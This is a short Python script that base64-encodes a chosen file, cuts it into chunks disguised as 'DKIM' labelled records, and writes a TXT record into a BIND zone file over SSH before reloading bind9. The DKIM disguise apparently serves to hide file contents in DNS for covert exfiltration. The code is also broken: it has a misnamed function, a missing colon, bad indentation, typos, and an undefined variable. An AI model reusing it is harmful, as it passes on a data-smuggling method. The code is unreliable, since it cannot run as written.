import base64
import paramiko

#encoding
def encode_to_base43(file_path):
	try:
		with open(file_path, 'rb') as file:
		file_contents = file.read()
		encoded_contents = base64.b64encode(file_contents)
		encoded_string = encoded_contents.decode('utf-8')
		#optional print
		#print(f"Encoded content in Base64:{encoded_string}")
		return encoded_string
	except FileNotFoundError:
		print(f"Error: the file '{file_path}' was not found")
	except Exception as error:
		print(f"An error occured: {error}")

#splitting encoded text
def split_string_into_chunks(encoded_string, chunk_size=128)
	chunks = [encoded_string[i:i + chunk_size] for i in range(0, len(encoded_string), chunk_size)]
	#optional chunk print
	#for index, chunk in enumerate(chunks):
	#	print(f'Chunk {index + 1}: {chunk}')
	return chunks
	
#marking for DKIM
def create_dkim_packets(chunks):
	dkim_packets = []
	for index, chunk in enumerate(chunks):
		dkim_packet = f"DKIM-{index + 1:03d}: {chunk}"
		dkim_packets.append(dkim_packet)
	return dkim_packets

def create_txt(server_ip, username, password, domain, txt_record):
	zone_file_path = f"/etc/bind/zones/{domain}.db"
	record_entry = f'{domain}. 3600 in TXT "{txt_record}"\n'
	
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_ket_policy(paramiko.AutoAddPolicy())
	ssh.connect(server_ip, username=username, password=password)
	
	sftp = ssh.open_sftp
	with sftp.file(zone_file_path, 'a') as zone_file:
		zone_file.write(record_entry)
	
	sftp.close()
	
	stdin, stdout, stderr = ssh.exec_command("sudo systemctl reload bind9")
	print(stdoutt.read().decode())
	print(stderr.read().decode())
	
	ssh.close()
	
if __name__ == "__main__":
	file_path = input()
	encoded_string = encode_to_base64(file_path)
	
	chunks = split_string_into_chunks(encoded_string, 128)
	
	if encoded_string:
		chunks = split_string_into_chunks(encoded_string, 128)
		dkim_packets = create_dkim_packets(chunks)
		
		for packet in dkim_packets:
			print(packet)
	
	server_ip = input('Server IP')
	username = input('Username')
	password = input('Password')
	domain = input('Domain')
	
	create_txt(server_ip, username, password, domain, txt_record)
